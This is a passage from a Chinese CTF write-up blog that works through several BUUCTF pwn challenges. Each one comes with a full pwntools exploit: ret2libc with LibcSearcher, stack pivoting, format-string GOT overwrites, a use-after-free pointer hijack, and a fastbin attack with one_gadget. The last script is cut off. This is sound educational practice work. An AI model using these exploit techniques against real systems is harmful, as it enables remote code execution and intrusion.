src="https://i.loli.net/2020/12/01/9tqkz3s1byJDBId.png" alt="image.png"></p><p>第一次往bss段上读入0x200字节，第二次往栈上读入0x20字节，<strong>只能刚好溢出8个字节</strong></p><p>故考虑进行栈迁移将栈迁移到bss段上</p><p>由于不存在可以直接getshell的gadget，故考虑ret2libc：先泄漏出write函数真实地址后使用LibcSearcher查找libc版本后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">29227</span>) <span class="comment"># process("./spwn") #</span></span><br><span class="line">e = ELF(<span class="string">"./spwn"</span>)</span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x8048511</span></span><br><span class="line">payload1 = p32(e.plt[<span class="string">'write'</span>]) + p32(e.sym[<span class="string">'main'</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">'write'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">payload2 = <span class="string">b'A'</span> * <span class="number">0x18</span> + p32(bss_addr - <span class="number">4</span>) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b'What do you want to say?'</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(hex(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">payload3 = p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"What is your name?"</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">b'What do you want to say?'</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即得flag</p><p><img src="https://i.loli.net/2020/12/01/BGsMI7SmyxXAbLD.png" alt="image.png"></p><h1 id="0x020-jarvisoj-level3-ret2libc"><a href="#0x020-jarvisoj-level3-ret2libc" class="headerlink" title="0x020.jarvisoj_level3 - ret2libc"></a>0x020.jarvisoj_level3 - ret2libc</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/12/01/RVDX2UIegLHboN4.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/01/QZ9KJTgDafe3NMh.png" alt="image.png"></p><p>存在120字节的溢出</p><p>由于不存在可以直接getshell的gadget，故考虑ret2libc：先泄漏出write函数真实地址后使用LibcSearcher查找libc版本后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level3'</span>) <span class="comment"># p = remote('node3.buuoj.cn',26149)</span></span><br><span class="line">e = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">'write'</span>]) + p32(e.sym[<span class="string">'main'</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">'write'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即得flag</p><p><img src="https://i.loli.net/2020/12/01/5lLM1IuKhdqHJwQ.png" alt="image.png"></p><blockquote><p>感觉ret2libc的题基本都大同小异啊…</p></blockquote><h1 id="0x021-BJDCTF-2nd-test-Linux基础知识"><a href="#0x021-BJDCTF-2nd-test-Linux基础知识" class="headerlink" title="0x021.[BJDCTF 2nd]test - Linux基础知识"></a>0x021.[BJDCTF 2nd]test - Linux基础知识</h1><p>题目只给了一个ssh，尝试进行连接</p><p><img src="https://i.loli.net/2020/12/01/WqAa8StsGKveMTw.png" alt="image.png"></p><p>尝试一下发现我们无法直接获得flag</p><p><img src="https://i.loli.net/2020/12/01/BsjidqO7gZcCfEv.png" alt="image.png"></p><p>查看一下文件权限，发现只有<code>ctf_pwn</code>用户组才有权限</p><p><img src="https://i.loli.net/2020/12/01/ETx7LSG5zC9Zeul.png" alt="image.png"></p><p>提示告诉我们有一个可执行文件test与其源码，尝试阅读</p><p><img src="https://i.loli.net/2020/12/01/g7qk6h8j2BM4Y3T.png" alt="image.png"></p><p>该程序会将我们的输入作为命令执行，但是会过滤一部分字符</p><p>尝试使用如下指令查看剩余的可用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$ ls /usr/bin/ /bin/ | grep -v -E "n|e|p|b|u|s|h|i|f|l|a|g"`</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/01/2zWulrZ5IOGcELP.png" alt="image.png"></p><p>我们发现在test程序中有效用户组为<code>ctf_pwn</code>，故使用该程序获取一个shell即可获得flag</p><p><img src="https://i.loli.net/2020/12/01/r4U1m3TiBjohkZF.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/12/01/j8LHM4DzXE6pZ5m.png" alt="image.png"></p><h1 id="0x022-BJDCTF-2nd-r2t4-fmtstr"><a href="#0x022-BJDCTF-2nd-r2t4-fmtstr" class="headerlink" title="0x022.[BJDCTF 2nd]r2t4 - fmtstr"></a>0x022.[BJDCTF 2nd]r2t4 - fmtstr</h1><p>惯例的<code>checksec</code>，开了NX和canary</p><p><img src="https://i.loli.net/2020/12/01/zPCHqKLigBI4Nwd.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/01/W6sVY2Hp4TFECBO.png" alt="image.png"></p><p>main中存在溢出，且存在格式化字符串漏洞</p><p><img src="https://i.loli.net/2020/12/01/jIJCdMwZ9ufy3ti.png" alt="image.png"></p><p>存在可以读取flag的后门函数</p><p>简单尝试可以发现格式化字符串是位于栈上的第六个参数</p><p><img src="https://i.loli.net/2020/12/01/eI31RvsilqYKpTZ.png" alt="image.png"></p><p>故考虑利用格式化字符串进行任意地址写劫持got表中的__stack_chk_fail为后门函数地址即可</p><p>需要注意的是<code>printf</code>函数遇到<code>\x00</code>会发生截断，故不能直接使用fmtstr_payload，而是要用手写的格式化字符串</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./r2t4'</span>)<span class="comment">#remote('node3.buuoj.cn',25635)</span></span><br><span class="line">e = ELF(<span class="string">'./r2t4'</span>)</span><br><span class="line">backdoor = <span class="number">0x400626</span></span><br><span class="line">payload = <span class="string">b'%64c%9$hn%1510c%10$hnaaa'</span> + p64(e.got[<span class="string">'__stack_chk_fail'</span>]+<span class="number">2</span>) + p64(e.got[<span class="string">'__stack_chk_fail'</span>])<span class="comment">#fmtstr_payload(6,&#123;e.got['__stack_chk_fail']:backdoor&#125;)</span></span><br><span class="line">payload.ljust(<span class="number">100</span>,<span class="string">b'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>获得flag</p><p><img src="https://i.loli.net/2020/12/01/3KvIRtcrT1z9LUm.png" alt="image.png"></p><h1 id="0x023-jarvisoj-fm-fmtstr"><a href="#0x023-jarvisoj-fm-fmtstr" class="headerlink" title="0x023.jarvisoj_fm - fmtstr"></a>0x023.jarvisoj_fm - fmtstr</h1><p>惯例的<code>checksec</code>，开了NX和canary</p><p><img src="https://i.loli.net/2020/12/01/NILo7xYAvaPjm9R.png" alt="image.png"></p><p>拖入IDA进行分析，存在格式化字符串漏洞</p><p><img src="https://i.loli.net/2020/12/01/lJIRWsXmNeEP67B.png" alt="image.png"></p><p>当x为4时直接getshell，x在bss段上</p><p><img src="https://i.loli.net/2020/12/01/dzUnkYrhxHR5EiB.png" alt="image.png"></p><p>格式化字符串在第13个参数的位置</p><p><img src="https://i.loli.net/2020/12/01/hDVSnkOyfovmQdL.png" alt="image.png"></p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>,&#123;<span class="number">0x804A02C</span>:<span class="number">0x4</span>&#125;)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25865</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即得flag</p><p><img src="https://i.loli.net/2020/12/01/u3UwrkKvGmgxW59.png" alt="image.png"></p><h1 id="0x024-jarvisoj-tell-me-something-ret2csu-ret2libc"><a href="#0x024-jarvisoj-tell-me-something-ret2csu-ret2libc" class="headerlink" title="0x024.jarvisoj_tell_me_something - ret2csu + ret2libc"></a>0x024.jarvisoj_tell_me_something - ret2csu + ret2libc</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/12/01/EbFBZKn2tPakdlg.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/01/ConYPhEF6378GWA.png" alt="image.png"></p><p>直接就有一个很大的溢出</p><p>由于不存在可以直接getshell的gadget，故考虑ret2libc：先泄漏出write函数真实地址后使用LibcSearcher查找libc版本后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'DEBUG'</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26270</span>)<span class="comment">#process('./guestbook') # </span></span><br><span class="line">e=  ELF(<span class="string">'./guestbook'</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006F3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006f1</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span>* offset + p64(pop_rsi_r15_ret) + p64(e.got[<span class="string">'write'</span>]) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(e.plt[<span class="string">'write'</span>]) + p64(e.sym[<span class="string">'main'</span>])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b'I have received your message, Thank you!\n'</span>)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>* offset + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即得flag</p><p><img src="https://i.loli.net/2020/12/01/4lBnGzRhCecZ28H.png" alt="image.png"></p><h1 id="0x025-BJDCTF-2nd-ydsneedgirlfriend2-overwrite"><a href="#0x025-BJDCTF-2nd-ydsneedgirlfriend2-overwrite" class="headerlink" title="0x025.[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite"></a>0x025.[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite</h1><p>惯例的<code>checksec</code>，开了NX和canary</p><p><img src="https://i.loli.net/2020/12/01/mDEwn7F62VP9klh.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/01/AbWlLCKU6Sdxn5D.png" alt="image.png"></p><p>看起来是一道堆题，存在分配、释放、打印堆块的功能</p><p>同时我们可以发现程序中存在后门函数</p><p><img src="https://i.loli.net/2020/12/01/Ym2n6FaAwBNOuV7.png" alt="image.png"></p><p>题目提示是Ubuntu18，也就是libc2.27，引入了tcache机制，但是没有tcache double free验证的版本</p><p>add函数中似乎只能分配7个堆块，空间有点紧张，而且每次分配后都会覆盖掉原来的堆块指针</p><p><img src="https://i.loli.net/2020/12/01/E5oFjm9cVOnTGXv.png" alt="image.png"></p><p>好在free后未将指针置0，<strong>存在Use After Free</strong>漏洞</p><p><img src="https://i.loli.net/2020/12/01/yDu6BFCNoMLItQd.png" alt="image.png"></p><p>同时我们可以发现<code>show()</code>函数中调用的是girlfriend[0][1]中的数据作为函数指针来执行，而<strong>girlfriend</strong>本身就是一个指针，在初始时分配的是0x10大小的堆块</p><p><img src="https://i.loli.net/2020/12/01/Tk48oH5yF7NPvrp.png" alt="image.png"></p><p>故我们只需要初始化girlfriend后free掉girlfriend再重新分配一个0x10大小的堆块即可改写该指针为后门函数地址后再show即可getshell</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./girlfriend'</span>) <span class="comment"># remote('node3.buuoj.cn',27506)</span></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'u choice :'</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input the length of her name:"</span>)</span><br><span class="line">    p.send(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Please tell me her name:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">"arttnba3"</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(backdoor))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>运行即可getshell</p><p><img src="https://i.loli.net/2020/12/01/QHNE6DmMORUiGcF.png" alt="image.png"></p><h1 id="0x026-jarvisoj-level4-ret2libc"><a href="#0x026-jarvisoj-level4-ret2libc" class="headerlink" title="0x026.jarvisoj_level4 - ret2libc"></a>0x026.jarvisoj_level4 - ret2libc</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/12/01/tUa3TvpBgSWh4bR.png" alt="I1__E1AGMQCM8C3C__IR4_N.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/01/NVODiTzqfhtI1Hy.png" alt="image.png"></p><p>直接就有一个很大的溢出</p><p>由于不存在可以直接getshell的gadget，故考虑ret2libc：先泄漏出write函数真实地址后使用LibcSearcher查找libc版本后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level4'</span>) <span class="comment"># p = remote('node3.buuoj.cn',28914)</span></span><br><span class="line">e = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">'write'</span>]) + p32(e.sym[<span class="string">'main'</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">'write'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即得flag</p><p><img src="https://i.loli.net/2020/12/01/FxEkX38erav47Ad.png" alt="image.png"></p><h1 id="0x027-V-amp-N2020-公开赛-simpleHeap-off-by-one-fastbin-attack-one-gadget"><a href="#0x027-V-amp-N2020-公开赛-simpleHeap-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="0x027.[V&amp;N2020 公开赛]simpleHeap - off by one + fastbin attack + one_gadget"></a>0x027.[V&amp;N2020 公开赛]simpleHeap - off by one + fastbin attack + one_gadget</h1><p>又是一道堆题来了，<del>看来往后应该都是堆题为主了</del>，不出所料，保  护  全  开</p><p><img src="https://i.loli.net/2020/12/01/iyIftbNOM4CrTka.png" alt="image.png"></p><p>同时题目提示Ubuntu16，也就是说没有tcache</p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/01/IWHrRozGqyLDfUX.png" alt="image.png"></p><p>这是一道有着分配、打印、释放、编辑堆块的功能的堆题，不难看出我们只能分配10个堆块，不过没有tcache的情况下，空间其实还是挺充足的</p><p>漏洞点在edit函数中，<strong>会多读入一个字节，存在off by one漏洞</strong>，利用这个漏洞我们可以<strong>修改一个堆块的物理相邻的下一个堆块的size</strong></p><p><img src="https://i.loli.net/2020/12/01/o9PlK4ECbHuFiN6.png" alt="image.png"></p><p>由于题目本身仅允许分配大小小于111的chunk，而进入unsorted bin需要malloc(0x80)的chunk，故我们还是考虑利用off by one的漏洞改大一个chunk的size送入unsorted bin后分割造成overlapping的方式获得libc的地址</p><p><img src="https://i.loli.net/2020/12/03/mh1HLy7cvGrCUAQ.png" alt="image.png"></p><p>因为刚好fastbin attack所用的chunk的size为0x71，故我们将这个大chunk的size改为<code>0x70 + 0x70 + 1 = 0xe1</code>即可</p><blockquote><p>fastbin attack中分配到__malloc_hook附近的fake chunk通常都是malloc(0x60)，也就是size == 0x71，这是因为在__malloc_hook - 0x23这个地址上fake chunk的SIZE的位置刚好是0x<code>7f</code>，满足了绕过fastbin的size检查的要求</p><p><img src="https://i.loli.net/2020/12/03/GBrOqIdPnDluXhb.png" alt="image.png"></p></blockquote><p>传统思路是将__malloc_hook改为one_gadget以getshell，但是直接尝试我们会发现根本无法getshell</p><p><img src="https://i.loli.net/2020/12/03/RXyTELuGiqKCSh7.png" alt="image.png"></p><p>这是因为one_gadget并非任何时候都是通用的，都有一定的先决条件，而当前的环境刚好不满足one_gadget的环境</p><p><img src="https://i.loli.net/2020/12/03/DlinxIM76eTLu8S.png" alt="image.png"></p><p>那么这里我们可以尝试使用realloc函数中的gadget来进行压栈等操作来满足one_gadget的要求，该段gadget执行完毕后会跳转至__realloc_hook（若不为NULL）</p><p><img src="https://i.loli.net/2020/12/03/PNyq3WFTU8mtYSM.png" alt="image.png"></p><p>而__realloc_hook和__malloc_hook刚好是挨着的，我们在fastbin attack时可以一并修改</p><p><img src="https://i.loli.net/2020/12/03/AG3oW65aVeCzMgt.png" alt="image.png"></p><p>故考虑修改__malloc_hook跳转至realloc函数开头的gadget调整堆栈，修改__realloc_hook为one_gadget即可getshell</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28978</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"choice: "</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"size?"</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># initialize chunk</span></span><br><span class="line">    new(<span class="number">0x18</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span 